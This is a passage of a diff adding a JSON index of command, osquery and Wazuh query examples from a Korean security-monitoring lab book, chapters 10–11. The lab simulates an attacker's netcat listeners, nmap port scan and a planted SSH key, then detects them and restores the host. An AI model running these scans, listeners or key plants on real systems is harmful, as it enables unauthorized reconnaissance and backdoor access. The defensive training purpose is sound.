+    "document": "volume01-chapter10.json",
+    "section": "10.3  TCP 리스너 실행",
+    "id": "C10-11",
+    "where": "kt66 VM · ccc 호스트 셸 · 터미널 A",
+    "file": "examples/rev02/chapter10/C10-11.txt",
+    "text": "nc -lk 192.168.0.107 31337"
+  },
+  {
+    "document": "volume01-chapter10.json",
+    "section": "10.3  TCP 리스너 실행",
+    "id": "C10-12",
+    "where": "kt66 VM · ccc 호스트 셸 · 터미널 B",
+    "file": "examples/rev02/chapter10/C10-12.txt",
+    "text": "sudo ss -lntp 'sport = :31337'"
+  },
+  {
+    "document": "volume01-chapter10.json",
+    "section": "리스너의 프로세스와 주소",
+    "id": "C10-13",
+    "where": "kt66 VM · ccc 호스트 셸",
+    "file": "examples/rev02/chapter10/C10-13.txt",
+    "text": "ps -p 181571 -o pid,ppid,user,lstart,args"
+  },
+  {
+    "document": "volume01-chapter10.json",
+    "section": "Wazuh의 포트 목록 변경 경보",
+    "id": "Q10-01",
+    "where": "Windows · Discover · wazuh-alerts-*",
+    "file": "examples/rev02/chapter10/Q10-01.txt",
+    "text": "agent.name:\"kt66-host\" AND rule.id:533"
+  },
+  {
+    "document": "volume01-chapter10.json",
+    "section": "포트 목록과 실행 기록 대조",
+    "id": "Q10-02",
+    "where": "Windows · Discover · wazuh-alerts-*",
+    "file": "examples/rev02/chapter10/Q10-02.txt",
+    "text": "agent.name:\"kt66-host\" AND rule.id:533\nAND (full_log:*31337* OR previous_output:*31337*)"
+  },
+  {
+    "document": "volume01-chapter10.json",
+    "section": "포트 목록과 실행 기록 대조",
+    "id": "Q10-03",
+    "where": "Windows · Discover · wazuh-alerts-*",
+    "file": "examples/rev02/chapter10/Q10-03.txt",
+    "text": "agent.name:\"kt66-host\"\nAND rule.groups:audit_command\nAND data.audit.command:nc"
+  },
+  {
+    "document": "volume01-chapter10.json",
+    "section": "kt66 경계 방화벽 확인",
+    "id": "C10-14",
+    "where": "kt66 VM · ccc 호스트 셸",
+    "file": "examples/rev02/chapter10/C10-14.txt",
+    "text": "sudo iptables -S INPUT\nsudo iptables -S KT66-PERIMETER\nip -4 route get 192.168.0.108\ncat ~/kt66/deployment/perimeter.sh"
+  },
+  {
+    "document": "volume01-chapter10.json",
+    "section": "누락된 경계 방화벽 준비",
+    "id": "C10-15",
+    "where": "kt66 VM · ccc 호스트 셸",
+    "file": "examples/rev02/chapter10/C10-15.txt",
+    "text": "sudo iptables-save > ~/book10-state/iptables.before\nsudo bash ~/kt66/deployment/perimeter.sh\nsudo iptables -S INPUT\nsudo iptables -S KT66-PERIMETER"
+  },
+  {
+    "document": "volume01-chapter10.json",
+    "section": "누락된 경계 방화벽 준비",
+    "id": "C10-16",
+    "where": "kt66 VM · ccc 호스트 셸",
+    "file": "examples/rev02/chapter10/C10-16.txt",
+    "text": "systemctl is-active rsyslog\nsudo tail -n 3 /var/log/kern.log"
+  },
+  {
+    "document": "volume01-chapter10.json",
+    "section": "공격자 VM의 포트 스캔",
+    "id": "C10-17",
+    "where": "공격자 VM · att 셸",
+    "file": "examples/rev02/chapter10/C10-17.txt",
+    "text": "command -v nmap\nnmap --version"
+  },
+  {
+    "document": "volume01-chapter10.json",
+    "section": "공격자 VM의 포트 스캔",
+    "id": "C10-18",
+    "where": "공격자 VM · att 셸",
+    "file": "examples/rev02/chapter10/C10-18.txt",
+    "text": "sudo apt-get update\nsudo apt-get install nmap"
+  },
+  {
+    "document": "volume01-chapter10.json",
+    "section": "공격자 VM의 포트 스캔",
+    "id": "C10-19",
+    "where": "공격자 VM · att 셸",
+    "file": "examples/rev02/chapter10/C10-19.txt",
+    "text": "date -Is\nnmap -sT -Pn -n -p 1-1000 \\\n--max-retries 1 192.168.0.107"
+  },
+  {
+    "document": "volume01-chapter10.json",
+    "section": "스캔 응답과 커널 원문",
+    "id": "C10-20",
+    "where": "kt66 VM · ccc 호스트 셸",
+    "file": "examples/rev02/chapter10/C10-20.txt",
+    "text": "sudo grep -F 'SRC=192.168.0.108 ' \\\n/var/log/kern.log | tail -n 5"
+  },
+  {
+    "document": "volume01-chapter10.json",
+    "section": "10.5  반복 차단 경보 분석",
+    "id": "Q10-04",
+    "where": "Windows · Discover · wazuh-alerts-*",
+    "file": "examples/rev02/chapter10/Q10-04.txt",
+    "text": "agent.name:\"kt66-host\" AND rule.id:4151\nAND data.srcip:\"192.168.0.108\""
+  },
+  {
+    "document": "volume01-chapter10.json",
+    "section": "규칙 조건과 누락 범위",
+    "id": "C10-21",
+    "where": "kt66 VM · ccc 호스트 셸",
+    "file": "examples/rev02/chapter10/C10-21.txt",
+    "text": "docker exec -it kt66-siem /bin/bash"
+  },
+  {
+    "document": "volume01-chapter10.json",
+    "section": "규칙 조건과 누락 범위",
+    "id": "C10-22",
+    "where": "kt66-siem · root 셸",
+    "file": "examples/rev02/chapter10/C10-22.txt",
+    "text": "sed -n '1,40p' \\\n/var/ossec/ruleset/rules/0900-firewall_rules.xml\nexit"
+  },
+  {
+    "document": "volume01-chapter10.json",
+    "section": "개별 차단 기록으로 범위 조사",
+    "id": "Q10-05",
+    "where": "Windows · Discover · wazuh-archives-*",
+    "file": "examples/rev02/chapter10/Q10-05.txt",
+    "text": "agent.name:\"kt66-host\"\nAND location:\"/var/log/kern.log\"\nAND data.action:DROP\nAND data.srcip:\"192.168.0.108\""
+  },
+  {
+    "document": "volume01-chapter10.json",
+    "section": "추가 조사와 방화벽 원상복구",
+    "id": "C10-23",
+    "where": "kt66 VM · ccc 호스트 셸",
+    "file": "examples/rev02/chapter10/C10-23.txt",
+    "text": "sudo iptables -S INPUT\nsudo iptables -D INPUT -i ens33 -j KT66-PERIMETER\nsudo iptables -F KT66-PERIMETER\nsudo iptables -X KT66-PERIMETER\nsudo iptables -S INPUT"
+  },
+  {
+    "document": "volume01-chapter10.json",
+    "section": "10.6  SQL로 현재 상태 직접 조회",
+    "id": "C10-24",
+    "where": "kt66 VM · ccc 호스트 셸",
+    "file": "examples/rev02/chapter10/C10-24.txt",
+    "text": "sudo osqueryi"
+  },
+  {
+    "document": "volume01-chapter10.json",
+    "section": "10.6  SQL로 현재 상태 직접 조회",
+    "id": "S10-01",
+    "where": "kt66 VM · sudo osqueryi의 osquery> 프롬프트",
+    "file": "examples/rev02/chapter10/S10-01.txt",
+    "text": "SELECT p.pid, p.name, p.path, l.address, l.port\nFROM listening_ports l\nJOIN processes p USING (pid)\nWHERE l.port IN (31337,31338);"
+  },
+  {
+    "document": "volume01-chapter10.json",
+    "section": "예약 조회 SQL의 검색 조건",
+    "id": "S10-02",
+    "where": "kt66 VM · sudo osqueryi의 osquery> 프롬프트",
+    "file": "examples/rev02/chapter10/S10-02.txt",
+    "text": ".schema authorized_keys\n.schema users"
+  },
+  {
+    "document": "volume01-chapter10.json",
+    "section": "공개 키와 사용자 연결",
+    "id": "S10-03",
+    "where": "kt66 VM · sudo osqueryi의 osquery> 프롬프트",
+    "file": "examples/rev02/chapter10/S10-03.txt",
+    "text": "SELECT u.username, k.key_file,\n       k.algorithm, k.comment\nFROM users u\nCROSS JOIN authorized_keys k USING (uid)\nWHERE u.uid >= 1000 OR u.uid = 0;"
+  },
+  {
+    "document": "volume01-chapter10.json",
+    "section": "공개 키와 사용자 연결",
+    "id": "S10-04",
+    "where": "kt66 VM · sudo osqueryi의 osquery> 프롬프트",
+    "file": "examples/rev02/chapter10/S10-04.txt",
+    "text": ".quit"
+  },
+  {
+    "document": "volume01-chapter10.json",
+    "section": "10.7  새 포트와 공개 키 관찰",
+    "id": "C10-25",
+    "where": "kt66 VM · ccc 호스트 셸",
+    "file": "examples/rev02/chapter10/C10-25.txt",
+    "text": "ls -l ~/book10-key.pub ~/book10-authorized_keys.before"
+  },
+  {
+    "document": "volume01-chapter10.json",
+    "section": "10.7  새 포트와 공개 키 관찰",
+    "id": "C10-26",
+    "where": "공격자 VM · att 셸",
+    "file": "examples/rev02/chapter10/C10-26.txt",
+    "text": "ls -l ~/book10-key ~/book10-key.pub\nssh-keygen -t ed25519 -N '' \\\n-C book10-key@attacker -f ~/book10-key\nssh-keygen -lf ~/book10-key.pub"
+  },
+  {
+    "document": "volume01-chapter10.json",
+    "section": "10.7  새 포트와 공개 키 관찰",
+    "id": "C10-27",
+    "where": "공격자 VM · att 셸",
+    "file": "examples/rev02/chapter10/C10-27.txt",
+    "text": "scp ~/book10-key.pub \\\nccc@192.168.0.107:book10-key.pub"
+  },
+  {
+    "document": "volume01-chapter10.json",
+    "section": "키 파일 사전 확인과 백업",
+    "id": "C10-28",
+    "where": "kt66 VM · ccc 호스트 셸",
+    "file": "examples/rev02/chapter10/C10-28.txt",
+    "text": "ls -ld ~/.ssh\nls -l ~/.ssh/authorized_keys ~/book10-key.pub\nssh-keygen -lf ~/book10-key.pub\nsha256sum ~/.ssh/authorized_keys"
+  },
+  {
+    "document": "volume01-chapter10.json",
+    "section": "키 파일 사전 확인과 백업",
+    "id": "C10-29",
+    "where": "kt66 VM · ccc 호스트 셸",
+    "file": "examples/rev02/chapter10/C10-29.txt",
+    "text": "mkdir -p ~/.ssh\nchmod 700 ~/.ssh\ntouch ~/.ssh/authorized_keys\nchmod 600 ~/.ssh/authorized_keys"
+  },
+  {
+    "document": "volume01-chapter10.json",
+    "section": "키 파일 사전 확인과 백업",
+    "id": "C10-30",
+    "where": "kt66 VM · ccc 호스트 셸",
+    "file": "examples/rev02/chapter10/C10-30.txt",
+    "text": "ls -l ~/book10-authorized_keys.before\ncp -p ~/.ssh/authorized_keys \\\n~/book10-authorized_keys.before\ncmp ~/.ssh/authorized_keys \\\n~/book10-authorized_keys.before"
+  },
+  {
+    "document": "volume01-chapter10.json",
+    "section": "제한된 실습 키 등록",
+    "id": "C10-31",
+    "where": "kt66 VM · ccc 호스트 셸",
+    "file": "examples/rev02/chapter10/C10-31.txt",
+    "text": "printf '\\n%s ' 'restrict,from=\"192.168.0.108\"' \\\n>> ~/.ssh/authorized_keys\ncat ~/book10-key.pub >> ~/.ssh/authorized_keys\nssh-keygen -lf ~/.ssh/authorized_keys"
+  },
+  {
+    "document": "volume01-chapter10.json",
+    "section": "제한된 실습 키 등록",
+    "id": "C10-32",
+    "where": "kt66 VM · ccc 호스트 셸 · 터미널 C",
+    "file": "examples/rev02/chapter10/C10-32.txt",
+    "text": "sudo ss -lntp 'sport = :31338'\nnc -lk 192.168.0.107 31338"
+  },
+  {
+    "document": "volume01-chapter10.json",
+    "section": "예약 결과에서 추가 행 찾기",
+    "id": "Q10-06",
+    "where": "Windows · Discover · wazuh-alerts-*",
+    "file": "examples/rev02/chapter10/Q10-06.txt",
+    "text": "agent.name:\"kt66-host\" AND rule.groups:osquery\nAND data.osquery.name:\n(kt66_listening_ports OR kt66_authorized_keys)\nAND data.osquery.action:added"
+  },
+  {
+    "document": "volume01-chapter10.json",
+    "section": "예약 결과에서 추가 행 찾기",
+    "id": "Q10-07",
+    "where": "Windows · Discover · wazuh-alerts-*",
+    "file": "examples/rev02/chapter10/Q10-07.txt",
+    "text": "agent.name:\"kt66-host\"\nAND data.osquery.name:kt66_listening_ports\nAND data.osquery.columns.port:31338\nAND data.osquery.action:added"
+  },
+  {
+    "document": "volume01-chapter10.json",
+    "section": "공개 키 결과의 의미",
+    "id": "Q10-08",
+    "where": "Windows · Discover · wazuh-alerts-*",
+    "file": "examples/rev02/chapter10/Q10-08.txt",
+    "text": "agent.name:\"kt66-host\"\nAND data.osquery.name:kt66_authorized_keys\nAND data.osquery.columns.comment:\n\"book10-key@attacker\"\nAND data.osquery.action:added"
+  },
+  {
+    "document": "volume01-chapter10.json",
+    "section": "10.8  실습 포트와 키 원상복구",
+    "id": "C10-33",
+    "where": "kt66 VM · ccc 호스트 셸",
+    "file": "examples/rev02/chapter10/C10-33.txt",
+    "text": "sudo ss -lntp \\\n'( sport = :31337 or sport = :31338 )'"
+  },
+  {
+    "document": "volume01-chapter10.json",
+    "section": "10.8  실습 포트와 키 원상복구",
+    "id": "C10-34",
+    "where": "kt66 VM · ccc 호스트 셸",
+    "file": "examples/rev02/chapter10/C10-34.txt",
+    "text": "cp -p ~/book10-authorized_keys.before \\\n~/.ssh/authorized_keys\ncmp ~/book10-authorized_keys.before \\\n~/.ssh/authorized_keys\nsha256sum ~/.ssh/authorized_keys"
+  },
+  {
+    "document": "volume01-chapter10.json",
+    "section": "처음 만든 키 파일 정리",
+    "id": "C10-35",
+    "where": "kt66 VM · ccc 호스트 셸",
+    "file": "examples/rev02/chapter10/C10-35.txt",
+    "text": "wc -c ~/.ssh/authorized_keys\nrm ~/.ssh/authorized_keys\nls -l ~/.ssh/authorized_keys"
+  },
+  {
+    "document": "volume01-chapter10.json",
+    "section": "처음 만든 키 파일 정리",
+    "id": "C10-36",
+    "where": "kt66 VM · ccc 호스트 셸",
+    "file": "examples/rev02/chapter10/C10-36.txt",
+    "text": "ls -la ~/.ssh\nrmdir ~/.ssh\nls -ld ~/.ssh"
+  },
+  {
+    "document": "volume01-chapter10.json",
+    "section": "사라진 행과 현재 상태 대조",
+    "id": "Q10-09",
+    "where": "Windows · Discover · wazuh-alerts-*",
+    "file": "examples/rev02/chapter10/Q10-09.txt",
+    "text": "agent.name:\"kt66-host\"\nAND data.osquery.name:kt66_listening_ports\nAND data.osquery.columns.port:(31337 OR 31338)\nAND data.osquery.action:removed"
+  },
+  {
+    "document": "volume01-chapter10.json",
+    "section": "사라진 행과 현재 상태 대조",
+    "id": "Q10-10",
+    "where": "Windows · Discover · wazuh-alerts-*",
+    "file": "examples/rev02/chapter10/Q10-10.txt",
+    "text": "agent.name:\"kt66-host\"\nAND data.osquery.name:kt66_authorized_keys\nAND data.osquery.columns.comment:\n\"book10-key@attacker\"\nAND data.osquery.action:removed"
+  },
+  {
+    "document": "volume01-chapter10.json",
+    "section": "임시 파일과 수집 준비 원상복구",
+    "id": "C10-37",
+    "where": "kt66 VM · ccc 호스트 셸",
+    "file": "examples/rev02/chapter10/C10-37.txt",
+    "text": "ls -l ~/book10-key.pub ~/book10-authorized_keys.before\nrm ~/book10-key.pub ~/book10-authorized_keys.before\nls -l ~/book10-key.pub ~/book10-authorized_keys.before"
+  },
+  {
+    "document": "volume01-chapter10.json",
+    "section": "임시 파일과 수집 준비 원상복구",
+    "id": "C10-38",
+    "where": "공격자 VM · att 셸",
+    "file": "examples/rev02/chapter10/C10-38.txt",
+    "text": "ls -l ~/book10-key ~/book10-key.pub\nrm ~/book10-key ~/book10-key.pub\nls -l ~/book10-key ~/book10-key.pub"
+  },
+  {
+    "document": "volume01-chapter10.json",
+    "section": "임시 파일과 수집 준비 원상복구",
+    "id": "C10-39",
+    "where": "kt66 VM · ccc 호스트 셸",
+    "file": "examples/rev02/chapter10/C10-39.txt",
+    "text": "sudo cp -p ~/book10-state/ossec.conf.before \\\n/var/ossec/etc/ossec.conf\nsudo cmp ~/book10-state/ossec.conf.before \\\n/var/ossec/etc/ossec.conf\nsudo /var/ossec/bin/wazuh-logcollector -t\nsudo /var/ossec/bin/wazuh-modulesd -t\nsudo systemctl restart wazuh-agent"
+  },
+  {
+    "document": "volume01-chapter10.json",
+    "section": "서비스와 설정 파일 정리",
+    "id": "C10-40",
+    "where": "kt66 VM · ccc 호스트 셸",
+    "file": "examples/rev02/chapter10/C10-40.txt",
+    "text": "sudo systemctl stop osqueryd\nsystemctl is-active osqueryd\nsudo ls -l /etc/osquery/osquery.conf \\\n/etc/osquery/osquery.flags"
+  },
+  {
+    "document": "volume01-chapter10.json",
+    "section": "서비스와 설정 파일 정리",
+    "id": "C10-41",
+    "where": "kt66 VM · ccc 호스트 셸",
+    "file": "examples/rev02/chapter10/C10-41.txt",
+    "text": "sudo rm /etc/osquery/osquery.conf \\\n/etc/osquery/osquery.flags\nsudo ls -l /etc/osquery"
+  },
+  {
+    "document": "volume01-chapter10.json",
+    "section": "10.9  결과가 다를 때의 확인 순서",
+    "id": "C10-42",
+    "where": "kt66 VM · ccc 호스트 셸",
+    "file": "examples/rev02/chapter10/C10-42.txt",
+    "text": "sudo journalctl -u osqueryd -n 30 --no-pager\nsudo tail -n 30 /var/ossec/logs/ossec.log"
+  },
+  {
+    "document": "volume01-chapter10.json",
+    "section": "원문·디코더·규칙 대조",
+    "id": "C10-43",
+    "where": "kt66 VM · ccc 호스트 셸",
+    "file": "examples/rev02/chapter10/C10-43.txt",
+    "text": "docker exec -it kt66-siem /bin/bash"
+  },
+  {
+    "document": "volume01-chapter10.json",
+    "section": "원문·디코더·규칙 대조",
+    "id": "C10-44",
+    "where": "kt66-siem · root 셸",
+    "file": "examples/rev02/chapter10/C10-44.txt",
+    "text": "sed -n '1,65p' \\\n/var/ossec/ruleset/decoders/0140-kernel_decoders.xml\nsed -n '/id=\"530\"/,/id=\"534\"/p' \\\n/var/ossec/ruleset/rules/0015-ossec_rules.xml\nsed -n '1,40p' \\\n/var/ossec/ruleset/rules/0545-osquery_rules.xml\nexit"
+  },
+  {
+    "document": "volume01-chapter11.json",
+    "section": "11.3  검색 조건 기록",
+    "id": "Q11-01",
+    "where": "Windows · Discover · wazuh-alerts-*",
+    "file": "examples/rev02/chapter11/Q11-01.txt",
+    "text": "agent.name: \"bastion\" AND\ndata.srcip: \"192.168.0.108\" AND\n(rule.id: \"5760\" OR rule.id: \"5715\")"
+  },
+  {
+    "document": "volume01-chapter11.json",
+    "section": "11.5  사례 B의 공개 키 변경",
+    "id": "Q11-02",
+    "where": "Windows · Discover · wazuh-alerts-*",
+    "file": "examples/rev02/chapter11/Q11-02.txt",
+    "text": "agent.name: \"bastion\" AND rule.groups: \"syscheck\" AND syscheck.path: \"/home/ccc/.ssh/authorized_keys\""
+  },
+  {
+    "document": "volume01-chapter11.json",
+    "section": "11.5  사례 B의 공개 키 변경",
+    "id": "Q11-03",
+    "where": "Windows · Discover · wazuh-alerts-*",
+    "file": "examples/rev02/chapter11/Q11-03.txt",
+    "text": "agent.name: \"bastion\" AND rule.id: \"5715\" AND data.dstuser: \"ccc\" AND data.srcip: \"192.168.0.108\" AND full_log: \"Accepted publickey\""
+  },
+  {
+    "document": "volume01-chapter11.json",
+    "section": "11.6  사례 C의 세 수집원",
+    "id": "Q11-04",
+    "where": "Windows · Discover · wazuh-alerts-*",
+    "file": "examples/rev02/chapter11/Q11-04.txt",
+    "text": "agent.name:\"kt66-host\" AND rule.id:533\nAND (full_log:*31337* OR previous_output:*31337*)"
+  },
+  {
+    "document": "volume01-chapter11.json",
+    "section": "스캔 범위와 기록 수의 해석",
+    "id": "Q11-05",
+    "where": "Windows · Discover · wazuh-alerts-*",
+    "file": "examples/rev02/chapter11/Q11-05.txt",
+    "text": "agent.name:\"kt66-host\" AND rule.id:4151\nAND data.srcip:\"192.168.0.108\""
+  },
+  {
+    "document": "volume01-chapter11.json",
+    "section": "스캔 범위와 기록 수의 해석",
+    "id": "Q11-06",
+    "where": "Windows · Discover · wazuh-archives-*",
+    "file": "examples/rev02/chapter11/Q11-06.txt",
+    "text": "agent.name:\"kt66-host\"\nAND location:\"/var/log/kern.log\"\nAND data.action:DROP\nAND data.srcip:\"192.168.0.108\""
+  },
+  {
+    "document": "volume01-chapter11.json",
+    "section": "11.7  증거 사본 준비",
+    "id": "C11-01",
+    "where": "Windows · PowerShell · 저장소 루트",
+    "file": "examples/rev02/chapter11/C11-01.txt",
+    "text": "Get-Location\nTest-Path .\\book11-analysis\nGet-ChildItem .\\examples\\rev02\\chapter11\\evidence"
+  },
+  {
+    "document": "volume01-chapter11.json",
+    "section": "11.7  증거 사본 준비",
+    "id": "C11-02",
+    "where": "Windows · PowerShell · 저장소 루트",
+    "file": "examples/rev02/chapter11/C11-02.txt",
+    "text": "New-Item -ItemType Directory .\\book11-analysis\nCopy-Item .\\examples\\rev02\\chapter11\\evidence\\*.json `\n  .\\book11-analysis\\\nGet-ChildItem .\\book11-analysis"
+  },
+  {
+    "document": "volume01-chapter11.json",
+    "section": "해시와 원본 위치 기록",
+    "id": "C11-03",
+    "where": "Windows · PowerShell · 저장소 루트",
+    "file": "examples/rev02/chapter11/C11-03.txt",
+    "text": "Get-FileHash .\\book11-analysis\\case-a.json `\n  -Algorithm SHA256\nGet-Content .\\book11-analysis\\manifest.json"
+  },
+  {
+    "document": "volume01-chapter11.json",
+    "section": "원문과 추출 필드 확인",
+    "id": "C11-04",
+    "where": "Windows · PowerShell · 저장소 루트",
+    "file": "examples/rev02/chapter11/C11-04.txt",
+    "text": "$caseA = Get-Content -Raw `\n  .\\book11-analysis\\case-a.json | ConvertFrom-Json\n$caseA | Select-Object -First 1 | Format-List *"
+  },
+  {
+    "document": "volume01-chapter11.json",
+    "section": "원문과 추출 필드 확인",
+    "id": "C11-05",
+    "where": "Windows · PowerShell · 저장소 루트",
+    "file": "examples/rev02/chapter11/C11-05.txt",
+    "text": "$caseA[0].agent | Format-List *\n$caseA[0].data | Format-List *\n$caseA[0].full_log"
+  }
+]
